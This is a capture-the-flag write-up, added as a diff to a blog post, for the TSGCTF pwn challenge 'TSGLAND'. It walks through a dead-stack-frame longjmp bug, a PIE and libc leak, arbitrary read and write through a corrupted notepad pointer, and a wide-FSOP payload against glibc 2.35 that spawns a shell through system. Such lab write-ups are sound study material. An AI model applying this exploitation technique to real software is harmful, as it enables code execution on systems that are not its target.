@@ -9,3 +9,557 @@ image: './tsgctf.png'
 
 import Callout from '@/components/Callout.astro'
 import { Icon } from 'astro-icon/components'
+
+## pwn - TSGLAND
+
+we get a binary named chall :
+```shell
+tlsbollei@tlsbollei mnt/.../tsg-land file chall
+chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e827c4b6e83ca9168be9be90f2a3d2d62dc62b49, not stripped
+tlsbollei@tlsbollei mnt/.../tsg-land checksec chall
+[*] '/mnt/c/Users/tlsbo/Downloads/tsg-land/tsg-land/chall'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b'.'
+    Stripped:   No
+tlsbollei@tlsbollei mnt/.../tsg-land
+
+```
+source code is as follows : 
+
+```c title="chall.c"
+#include <setjmp.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+
+jmp_buf env[5];
+int launched[5];
+
+void init() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+}
+
+int read_int(char *prompt) {
+    int x;
+    printf("%s > ", prompt);
+    scanf("%d", &x);
+    for (;getchar() != '\n';);
+    return x;
+}
+
+void notepad() {
+    void *_[99]; // padding
+    char *buf = malloc(0x1000);
+    if (buf == NULL) {
+        return;
+    }
+    if (setjmp(env[1]) != 0) {
+        printf("saved content: %s\n", buf);
+    }
+    for (;;) {
+        int q = read_int("1: edit, 0: save and quit");
+        if (q == 0) {
+            longjmp(env[0], 1);
+        } else {
+            printf("enter the content > ");
+            fgets(buf, 0x1000, stdin);
+        }
+    }
+}
+
+void pwquiz() {
+    void *_[100]; // padding
+    char *hints[3] = {
+        "Hint 1: an English word",
+        "Hint 2: length is 8",
+        "Hint 3: the most used password in the world"
+    };
+
+    setjmp(env[2]);
+
+    for (;;) {
+        int q = read_int("1~3: hint, 4: answer, 0: quit");
+        if (q == 0) {
+            longjmp(env[0], 1);
+        } else if (1 <= q && q <= 3) {
+            printf("%s\n", hints[q-1]);
+        } else if (q == 4) {
+            char buf[16];
+            printf("answer > ");
+            scanf("%15s", buf);
+            if (strcmp("password", buf) == 0) {
+                puts("Congraturations!!!");
+                longjmp(env[0], 123456);
+            } else {
+                puts("...");
+            }
+        }
+    }
+}
+
+struct board {
+    int board[16];
+    int sx;
+    int sy;
+};
+
+void move(struct board *b, char m) {
+    if (b->sx < 0 || 3 < b->sx || b->sy < 0 || 3 < b->sy) {
+        return;
+    }
+    switch (m) { // left, down, up, right
+        case 'a': // left
+            if (b->sx < 3) {
+                b->board[b->sy*4 + b->sx] = b->board[b->sy*4 + b->sx + 1];
+                b->sx++;
+            }
+            break;
+        case's': // down
+            if (b->sy > 0) {
+                b->board[b->sy*4 + b->sx] = b->board[(b->sy-1)*4 + b->sx];
+                b->sy--;
+            }
+            break;
+        case 'w': // up
+            if (b->sy < 3) {
+                b->board[b->sy*4 + b->sx] = b->board[(b->sy+1)*4 + b->sx];
+                b->sy++;
+            }
+            break;
+        case 'd': // right
+            if (b->sx > 0) {
+                b->board[b->sy*4 + b->sx] = b->board[b->sy*4 + b->sx - 1];
+                b->sx--;
+            }
+            break;
+        default:
+            break;
+    }
+}
+
+void print_board(struct board *b) {
+    for (int i = 0; i < 4; i++) {
+        for (int j = 0; j < 4; j++) {
+            if (i == b->sy && j == b->sx) {
+                printf("[] ");
+            } else {
+                printf("%02d ", b->board[i*4+j]);
+            }
+        }
+        puts("");
+    }
+}
+
+int judge(struct board *b) {
+    for (int i = 0; i < 15; i++) {
+        if (b->board[i] != i) {
+            return 0;
+        }
+    }
+    return 1;
+}
+
+void slide_puzzle() {
+    srand(time(NULL));
+    void *_[100]; // padding
+    struct board b = {{}, 3, 3};
+    for (int i = 0; i < 16; i++) {
+        b.board[i] = i;
+    }
+
+    // randomize board
+    for (int i = 0; i < 100; i++) {
+         move(&b, "aswd"[rand()%4]);
+    }
+
+    // move space to bottom-right
+    move(&b, 'a');
+    move(&b, 'a');
+    move(&b, 'a');
+    move(&b, 'w');
+    move(&b, 'w');
+    move(&b, 'w');
+
+    setjmp(env[3]);
+    
+    for (;;) {
+        print_board(&b);
+        printf("a: left, s: down, w: up, d: right, q: save and quit > ");
+        char c = getchar();
+        if (c == 'q') {
+            longjmp(env[0], 1);
+        } else if (c != '\n') {
+            move(&b, c);
+            if (judge(&b)) {
+                print_board(&b);
+                puts("Congraturations!");
+                launched[3] = 0;
+                longjmp(env[0], 1);
+            }
+        }
+    }
+}
+
+void int_float_translater() {
+    void *_[94]; // padding
+    unsigned long num;
+    char *__ = alloca(100); // padding 2
+    
+    setjmp(env[4]);
+
+    for (;;) {
+        int q = read_int("1: uint64 to float64, 2: float64 to uint64, 0: quit");
+        switch (q) {
+            case 1:
+                printf("num(uint64) > ");
+                scanf("%ld", &num);
+                for (;getchar() != '\n';);
+                printf("%1$ld = %2$f = %2$e\n", num, *(double *)&num);
+                break;
+            case 2:
+                printf("num(float64) > ");
+                scanf("%lf", (double *)&num);
+                for (;getchar() != '\n';);
+                printf("%1$f = %2$ld = 0x%2$lx\n", *(double *)&num, num);
+                break;
+            case 0:
+                longjmp(env[0], 1);
+            default:
+                break;
+        }
+    }
+}
+
+void *apps[5] = {NULL, notepad, pwquiz, slide_puzzle, int_float_translater};
+
+void print_desktop() {
+    puts("...");
+    puts("1: notepad.exe");
+    puts("2: password ate quiz ~returns~");
+    puts("3: 4x4 slide puzzle");
+    puts("4: int float translater");
+    puts("0: exit TSG LAND");
+}
+
+int main() {
+    init();
+    puts("Welcome to TSG LAND!!!");
+    int res = setjmp(env[0]);
+    if (res == 123456) {
+        puts("You are pw-ate-quiz m@ster!");
+    } else if (res != 0) {
+        puts("Welcome back!");
+    }
+
+    for (;;) {
+        print_desktop();
+        int q = read_int("May I help you?");
+        if (q <= -1 || 5 <= q) {
+            puts("invalid command");
+        } else if (q == 0) {
+            puts("bye");
+            exit(0);
+        } else {
+            if (launched[q]) {
+                longjmp(env[q], 1);
+            } else {
+                launched[q] = 1;
+                ((void(*)())apps[q])();
+            }
+        }
+    }
+}
+```
+
+### The bug we hold onto
+
+The bug is longjmp into a dead stack frame. `main()` saves `env[0]` with `_setjmp`, then later resumes apps by `longjmp(env[q], 1)` if they were launched before.
+
+```asm
+1cc7: lea env(%rip),%rax        
+1cd1: call 1080 <_setjmp@plt>   # save env[0] here
+1d7c: test %eax,%eax
+1d7e: []                       # if launched[q] != 0
+1da7: mov $0x1,%esi
+1dac: mov %rax,%rdi             # rdi = &env[q]
+1daf: call 10e0 <longjmp@plt>    # jump back into app
+```
+
+These apps don't return normally, they quit using ```longjmp(env[0], 1)```. The lack of a traditional return means that their stack frames are no longer a valid call chain, despite this later on ```main``` jumps back inside of them, so this is a stack ressurection vulnerability.
+
+### Defeating PIE using print leaks
+
+So, what can we use our stack ressurection vulnerability for? Simply said, because different functions overlap the same dead stack frame, we can corrupt local variables. You can immediately notice what local variable we can corrupt to get an arbitrary read plus write, but I'll get to that later. Firstly, we need to defeat PIE by getting a leak.
+
+We notice a key observation and that is that ```pwquiz``` stores rodata pointers on its stack
+
+```asm
+13b1: lea 0x2053(%rip),%rax   # hint 1
+13b8: mov %rax,-0x340(%rbp)
+
+13bf: lea 0x206b(%rip),%rax   # hint 2
+13c6: mov %rax,-0x338(%rbp)
+
+13cd: lea 0x2080(%rip),%rax   # hint 3  
+13d4: mov %rax,-0x330(%rbp)
+```
+
+dumping .rodata really confirms our finding :
+
+```
+2080: "Hint 3: the most used password in the world\0"
+```
+
+Second key observation is that slide_puzzle's board starts at the exact same stack offset, which beautifully complements our initial hypothesis.
+In ```slide_puzzle```, we can see that the board struct lives at ```rbp-0x330```
+
+```asm
+18f6: lea -0x330(%rbp),%rax   
+19a5: mov %rax,%rdi
+19a8: call 1713 <print_board> # prints b.board[] as ints
+```
+
+we can finalize:
+
+pwquiz local ```-0x330(%rbp)``` contains the 64-bit pointer ```PIE_base + 0x2080```
+slide_puzzle local ```b.board[0]``` is the first 4 bytes at ```rbp-0x330```
+slide_puzzle ```b.board[1]``` is the next 4 bytes at ```rbp-0x32c```
+
+and so because of our stack ressurection bug, after running ```pwquiz()``` and then resuming ```slide_puzzle()``` via ```longjmp(env[3],1)```, the memory at ```rbp-0x330``` is no longer the puzzle tiles, it is whatever pwquiz left there.
+
+### What to do with this information?
+
+Because ```print_board``` prints each element as an ```int```
+
+```
+1778: mov (%rax,%rdx,4),%eax   # load b->board[idx] 
+178c: call 1050 <printf@plt>   # "%02d"
+```
+
+We can exploit this as follows :
+
+```python
+leak = (board[0][1] << 32) | board[0][0]
+baseaddr = leak - 0x2080
+```
+
+this works because ```leak == PIE_base + 0x2080``` (the address of our third hint), and you subtract the known rodata offset 0x2080 to get the PIE base.
+that is also why the constant is exactly 0x2080, it is not random, it is the rodata symbol that pwquiz leaves behind at the exact overlapping stack slot.
+
+### translator + puzzle moves becomes our write primitive
+
+we can use the 4x4 puzzle as a 32bit shuffler. this is because the ```move()``` function  literally copies ints around and does:
+
+```
+...load neighbor int..
+15ad: movslq %esi,%rdx
+15b0: mov %ecx,(%rax,%rdx,4)   # neighbor write to blank slot
+```
+
+so each move does not "swap tiles", instead, it copies an ```int``` from a neighbor into the blank position and updates sx/sy. this means we can route specific 32 bit values through the grid with a known path, but still not yet.
+
+#### how translator steps in our equation
+
+translator scans into a local 64-bit num at ```rbp-0x310```
+
+```
+1b64: lea -0x310(%rbp),%rax
+1b78: call __isoc99_scanf@plt   # scanf("%ld", &num) from oru source
+```
+
+translator lets you place 8 controlled bytes onto its stack frame. with the stack resurrection bug, those bytes land inside other app locals.
+here is a holy shit moment :
+
+slide_puzzle board base: ```rbp-0x330```, and notepad pointer buf lives at ```rbp-0x328```. that means the notepad pointer overlaps puzzle elements board[2] and board[3]. and we can see in the source..  ```printf("%s", buf)```, ```fgets(buf, 0x1000, stdin)```. this gives us an arbitrary read AND write!
+
+### notepad magic
+
+confirming our logic above:
+
+```asm
+12d2: call malloc@plt
+12d7: mov %rax,-0x328(%rbp)     # save buf pointer
+```
+
+and when we resume notepad using setjmp != 0, we do ```printf("%s", buf)```
+
+```asm
+12f6: call _setjmp@plt          # env[1] 
+12fb: test %eax,%eax
+12fd: je 131d
+12ff: mov -0x328(%rbp),%rax     # load buf pointer
+1309: lea 0x2011(%rip),%rdi     # "saved content: %s\n"
+1318: call printf@plt
+```
+
+so if we corrupt this pointer at ```rbp-0x328```, we can get an arbitrary read via ```%s```
+and our foreshadow arbitrary write looks like this:
+
+```asm
+136a: mov -0x328(%rbp),%rax     # buf pointer
+1371: mov $0x1000,%esi
+1379: call fgets@plt            # writes our bytes to *buf, nice
+```
+
+<Callout title="the game of the exploit" variant="important">
+the exploits entire game is: use translator + puzzle moves to rewrite notepad saved buf pointer, giving us AAR and AAW.
+</Callout>
+
+### leaking the libc 
+
+we do :
+
+```
+translator(chall.got.puts & 0xffffffff)
+puzzle('<>')
+io.sendlineafter(b'? > ', b'1')
+io.recvuntil(b'saved content: ')
+libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - libc.sym.puts
+```
+
+we write only the low 32 bits of the desired pointer, which is the puts@GOT address. the high bits of the notepad buf pointer were originally a heap pointer like 0x00005555........ and PIE mappings are also typically 0x00005555........ locally/remote. so changing only the low dword often retargets the pointer from heap to PIE region. thats why we use & 0xffffffff. 
+
+notepad resumes = printf("%s", buf) reads bytes at puts@GOT = GOT holds the resolved libc address of puts = subtract libc.sym.puts and we get libc base.
+
+### FSOP
+
+now we want notepad, so the fgets, to write into libc stdout FILE object, which is at 0x7f........, not 0x00005555........, so we overwrite both halves
+
+```
+translator((_IO_2_1_stdout_ >> 32) & 0xffffffff) 
+translator(_IO_2_1_stdout_ & 0xffffffff)         
+```
+
+after these two shuffles, notepad saved pointer becomes:
+
+```
+buf == libc.sym._IO_2_1_stdout_
+```
+
+so the fgets of notepad becomes a write directly into libc global stdout struct, which is exactly FSOP.
+
+### brain freeze
+
+Right. FSOP. But... wasnt that patched in like glibc ≥2.24/2.27? Checking the version of the handout libc shows:
+
+```shell
+tlsbollei@tlsbollei mnt/.../tsg-land strings libc.so.6 | grep "GNU C Library"
+GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.11) stable release version 2.35.
+tlsbollei@tlsbollei mnt/.../tsg-land
+```
+
+2.35. Not good. 
+After 25 minutes of staring into a wall, I realized that we can just use ideas that remain valid.
+As per vtable bypass articles,
+
+<Callout title="FILE structure exploitation" variant="important">
+You can not just point a FILEs vtable to an arbitrary fake jump table anymore, because glibc validates the vtable pointer is inside the read-only __libc_IO_vtables region (or it sends us to hell).
+</Callout>
+
+our exploit still works on glibc 2.35 because we do not rely on an arbitrary vtable anywhere, we can use two ideas that remain valid:
+
+1. Pick a vtable that is already inside __libc_IO_vtables (so the check passes)
+2. Pivot into  wide-IO and hijack _wide_vtable, which historically is not validated by the same IO_validate_vtable() fast-path (House of Paper, wide FSOP style)
+
+### confirming write-what-where into stdout
+
+notepad local pointer is stored at rbp-0x328 and used as the destination for fgets:
+
+```
+12d2: call   malloc@plt
+12d7: mov    %rax,-0x328(%rbp)      ; save buf pointer
+
+12ff: mov    -0x328(%rbp),%rax
+1318: call   printf@plt              ; printf("saved content: %s\n", buf)
+
+136a: mov    -0x328(%rbp),%rax
+1379: call   fgets@plt               ; fgets(buf, 0x1000, stdin)
+```
+
+once the exploit corrupts that saved buf pointer to equal libc:_IO_2_1_stdout_, the line:
+
+```python
+io.sendlineafter(b' > ', fs)
+```
+
+becomes ```fgets(stdout, aa)```, overwriting the real ```stdout FILE``` object in libc.
+additionally, after we return to the menu, the program immediately calls ```puts``` a bunch of times in ```print_desktop```
+
+```asm
+1c53: call puts@plt
+1c62: call puts@plt
+```
+
+so the program naturally triggers stdio after we corrupt stdout.
+
+### exploiting
+
+final payload is > corrupt ```stdout``` so libc calls ```system```.
+
+```
+shellpop = flat({
+  0x00: b' sh\0...',
+  0x88: p64(libc.address + 0x21ca60),         #  lock
+  0xA0: p64(stdout+0xe0),                      # _wide_data
+  0xC0: p32(-1),                               # _mode = -1 (wide)
+  0xD8: _IO_wfile_jumps - 0x38 + 0x18,         # vtable (legit libc table)
+  0xE0+0x68: p64(system),                      #  target
+})
+```
+step by step:
+
+```python
+0xA0: p64(stdout + 0xe0)
+```
+
+this matches ```_wide_data``` being a field in ```_IO_FILE``` (glibc struct layout) and is the classic setup for wide FSOP.
+
+```python
+0xC0: p32(-1)    # _mode = -1
+```
+setting ```_mode``` negative pushes glibc down wide-character code paths (where _wide_data is used heavily).
+
+```python
+0xD8: _IO_wfile_jumps - 0x38 + 0x18   # _IO_wfile_jumps - 0x20
+```
+
+this is our patched FSOP compatibility part, ```_IO_wfile_jumps``` is a real libc jump living in ```__libc_IO_vtables``` region, so we pass the vtable check, and the small subtraction is a common trick because the validator checks in range, and not exact symbol start.
+
+```python
+0x88: p64(libc.address + 0x21ca60)
+```
+
+glibc may lock the stream, if _lock is garbage, we crash. so we give it a pointer to a valid lock object in libc.
+
+#### wide-vtable pivot and why the patch does not save it
+
+```
+w_offset = 0xE0
+w_offset+0x68: p64(system)
+w_offset+0xE0: p64(stdout + 0xe0)
+```
+
+we place a wide_data object at stdout+0xe0 and at the end of that object, we set _wide_vtable = stdout+0xe0, so wide_vtable points into our own controlled memory. inside this fake vtable, at offset 0x68, we put the function pointer system.
+when libc takes a wide-IO path and does something like "call the wide overflow/put function via _wide_vtable", it will fetch the pointer we planted and call it, which in our case, is system.
+
+#### why system("sh") works even though the signature is bad
+
+in these wide-vtable FSOP chains, the call site typically passes the ```FILE*``` as the first argument (in rdi on amd64). If we replace that target with system, then ```system(rdi)``` treats that ```FILE*``` pointer as a ```char*```.
+so we put the cmd string at the start of the FILE object:
+
+```python
+0x00: b' sh\0...',
+```
+
+when our corrupted code path calls our planted system, it becomes
+
+```
+system((char*)stdout)
+```
+
+and since ```stdout``` begins with ```"sh\0"```, we get a shell
